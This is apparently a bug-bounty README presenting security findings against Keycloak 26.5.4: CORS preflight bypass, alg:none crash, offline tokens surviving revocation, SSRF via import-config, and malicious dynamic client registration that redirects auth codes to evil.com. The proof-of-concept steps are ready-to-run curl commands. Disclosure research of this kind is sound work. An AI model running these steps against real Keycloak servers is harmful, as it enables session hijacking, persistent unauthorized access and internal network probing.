# Keycloak 26.5.4 — Security Research & Bug Bounty PoCs

Manual security assessment of Keycloak 26.5.4 (latest stable) targeting the official bug bounty program scope.

## Environment

| Item | Detail |
|---|---|
| Keycloak Version | 26.5.4 (2026-02-20 release) |
| Distribution | Quarkus ZIP |
| Java | OpenJDK 21.0.10 |
| Test Host | VPS — Ubuntu 24.04 |

## Findings Summary

| # | Title | Severity | CVSS |
|---|---|---|---|
| 1 | [CORS OPTIONS Preflight Bypass — webOrigins Not Enforced for Preflight](#finding-1) | **MEDIUM** | 5.3 |
| 2 | [alg:none JWT causes HTTP 500 (NullPointerException)](#finding-2) | **MEDIUM** | 5.3 |
| 3 | [Offline Token Persistence After Admin Session Revocation](#finding-3) | **HIGH** | 7.5 |
| 4 | [SSRF via Identity Provider import-config Endpoint](#finding-4) | **MEDIUM** | 6.5 |
| 5 | [DCR Bypass: Authenticated Users Register Clients with Arbitrary redirect_uri → Auth Code Theft](#finding-5) | **HIGH** | 8.0 |
| 6 | [SSRF via DCR jwks_uri — Low-Privilege Internal Network Probing](#finding-6) | **MEDIUM** | 6.5 |

---

## Finding #1 — CORS OPTIONS Preflight Bypass {#finding-1}

**Type:** CORS OPTIONS preflight bypasses `webOrigins` allowlist
**Affected:** All OIDC endpoints, Admin REST API

Keycloak's `webOrigins` per-client allowlist is correctly enforced for actual HTTP responses, but **completely bypassed for `OPTIONS` preflight requests**. Any origin (including `null`) receives `Access-Control-Allow-Origin` with `credentials: true` in OPTIONS responses, allowing browsers from unconfigured origins to pass the preflight stage.

**Impact:** Actual response bodies (tokens) remain unreadable for unconfigured origins (browser blocks them). However, **write-side effects complete before the browser blocks the response** — admin write operations (create user, delete client) succeed cross-origin from any origin if the attacker possesses a Bearer token. The `null` origin bypass is a building block for future bypasses.

**Quick reproduction:**
```bash
# Client webapp has webOrigins: ["https://legitimate-app.com"]
# evil.com is NOT in webOrigins — preflight should be blocked

# ACTUAL POST response — correctly no ACAO (protected):
# curl -si -X POST http://<KC_HOST>/realms/test/protocol/openid-connect/token \
#   -H "Origin: https://evil.com" ... → HTTP 200, NO Access-Control-Allow-Origin header

# OPTIONS PREFLIGHT — BYPASS (webOrigins not enforced):
curl -si -X OPTIONS http://<KC_HOST>/realms/test/protocol/openid-connect/token \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Authorization,Content-Type"
# → Access-Control-Allow-Origin: https://evil.com  ← BYPASS
# → Access-Control-Allow-Credentials: true
```

See: [`pocs/poc1_cors_token_hijack.html`](pocs/poc1_cors_token_hijack.html) and [`pocs/poc2_cors_null_origin.html`](pocs/poc2_cors_null_origin.html)

---

## Finding #2 — alg:none JWT → HTTP 500 {#finding-2}

**Type:** Unhandled exception in security-critical code path
**Affected:** `/realms/{realm}/protocol/openid-connect/userinfo`

Submitting a JWT with `"alg": "none"` causes an uncaught `NullPointerException` in the JWT validation pipeline. Server returns HTTP 500 instead of 401.

**Quick reproduction:**
```bash
ALG_NONE="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImV4cCI6OTk5OTk5OTk5OX0."
curl http://<KC_HOST>/realms/test/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer $ALG_NONE"
# Returns: HTTP 500 (expected: 401)
```

See: [`pocs/poc3_alg_none_npe.py`](pocs/poc3_alg_none_npe.py)

---

## Finding #3 — Offline Token Persistence After Admin Revocation {#finding-3}

**Type:** Improper session revocation / persistent credential after forced logout
**Affected:** Offline Session Management, Token Revocation endpoints

When an administrator performs incident response actions after a security breach (force-logout all sessions, push not-before policy), **offline tokens remain fully valid** and continue to produce new access tokens. The admin REST API provides no working endpoint to delete offline sessions — all `DELETE` requests return `HTTP 404`.

**Attack scenario:**
1. Attacker obtains an offline token using compromised credentials
2. Organization detects breach; admin forces logout of all user sessions
3. Admin pushes not-before revocation policy
4. **Attacker's offline token still works** — full persistent access maintained

**Quick reproduction:**
```bash
# 1. Get offline token
OFFLINE_TOKEN=$(curl -s -X POST http://<KC_HOST>/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=password&username=testuser&password=Password123&scope=offline_access" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['refresh_token'])")

# 2. Admin forces logout
curl -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://<KC_HOST>/admin/realms/test/users/$USER_ID/logout"  # HTTP 204

# 3. Admin pushes notBefore
curl -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://<KC_HOST>/admin/realms/test/push-revocation"  # {}

# 4. Offline token STILL WORKS
curl -s -X POST http://<KC_HOST>/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=refresh_token&refresh_token=$OFFLINE_TOKEN"
# → Returns valid access_token!
```

See: [`pocs/poc4_offline_token_persistence.sh`](pocs/poc4_offline_token_persistence.sh)

---

## Finding #4 — SSRF via IdP import-config {#finding-4}

**Type:** Server-Side Request Forgery
**Affected:** `POST /admin/realms/{realm}/identity-provider/import-config`
**Required role:** `manage-identity-providers` (realm admin level)

The `fromUrl` parameter causes Keycloak to make an outbound HTTP request to any specified URL — including internal network addresses. This enables internal port scanning and internal service access for any user with the `manage-identity-providers` realm role.

**Quick reproduction:**
```bash
# Start listener: python3 -m http.server 9999 --bind 127.0.0.1

curl -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"providerId":"oidc","fromUrl":"http://127.0.0.1:9999/.well-known/openid-configuration"}' \
  "http://<KC_HOST>/admin/realms/test/identity-provider/import-config"

# Listener receives: "GET /.well-known/openid-configuration HTTP/1.1"
```

See: [`pocs/poc5_ssrf_idp_import.sh`](pocs/poc5_ssrf_idp_import.sh)

---

## Finding #5 — DCR Auth Code Interception {#finding-5}

**Type:** Broken Access Control — DCR Trusted Hosts policy bypass
**Affected:** `POST /realms/{realm}/clients-registrations/openid-connect`
**Required privilege:** Any authenticated realm user

Any authenticated realm user can register OIDC clients with **arbitrary redirect URIs** via Dynamic Client Registration. The "Trusted Hosts" DCR policy is configured only for the `anonymous` subType — the `authenticated` subType has no host/URI restriction. Registered clients are **immediately active** (no admin approval), allowing complete auth code interception of any realm user.

**Quick reproduction:**
```bash
# 1. Attacker gets any user token
ATTACKER_TOKEN=$(curl -s -X POST http://<KC_HOST>/realms/test/protocol/openid-connect/token \
  -d "client_id=webapp&grant_type=password&username=testuser&password=Password123&scope=openid" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# 2. Register malicious client (Trusted Hosts policy NOT applied to authenticated DCR)
curl -s -X POST http://<KC_HOST>/realms/test/clients-registrations/openid-connect \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"client_name":"Legitimate App","redirect_uris":["https://evil.com/steal"],
       "grant_types":["authorization_code","refresh_token"],"response_types":["code"]}'
# → HTTP 201 {"client_id":"...","client_secret":"...","redirect_uris":["https://evil.com/steal"]}

# 3. Send victim: http://<KC_HOST>/realms/test/auth?client_id=<malicious_id>&redirect_uri=https://evil.com/steal
# → Victim logs in on REAL Keycloak domain → code sent to evil.com → attacker gets victim tokens
```

See: [`pocs/poc6_dcr_client_hijack.sh`](pocs/poc6_dcr_client_hijack.sh)

---

## PoC Files

| File | Description |
|---|---|
| [`pocs/poc1_cors_token_hijack.html`](pocs/poc1_cors_token_hijack.html) | Browser PoC — CORS cross-origin token theft |
| [`pocs/poc2_cors_null_origin.html`](pocs/poc2_cors_null_origin.html) | Browser PoC — `null`-origin sandboxed iframe attack |
| [`pocs/poc3_alg_none_npe.py`](pocs/poc3_alg_none_npe.py) | Python PoC — alg:none → HTTP 500 |
| [`pocs/poc4_offline_token_persistence.sh`](pocs/poc4_offline_token_persistence.sh) | Shell PoC — offline token survives admin revocation |
| [`pocs/poc5_ssrf_idp_import.sh`](pocs/poc5_ssrf_idp_import.sh) | Shell PoC — SSRF via IdP import-config |
| [`pocs/poc6_dcr_client_hijack.sh`](pocs/poc6_dcr_client_hijack.sh) | Shell PoC — DCR bypass → victim auth code theft |
| [`pocs/poc7_dcr_jwks_ssrf.sh`](pocs/poc7_dcr_jwks_ssrf.sh) | Shell PoC — SSRF via DCR jwks_uri (low-privilege) |

## Full Report

See [`REPORT.md`](REPORT.md) for the complete bug bounty submission document including:
- Detailed technical description
- Step-by-step reproduction with HTTP requests/responses
- Attack scenarios
- Security impact analysis
- Remediation recommendations

---

*This research is conducted under the Keycloak bug bounty program on a private, researcher-controlled environment. No production systems or real user data were accessed.*
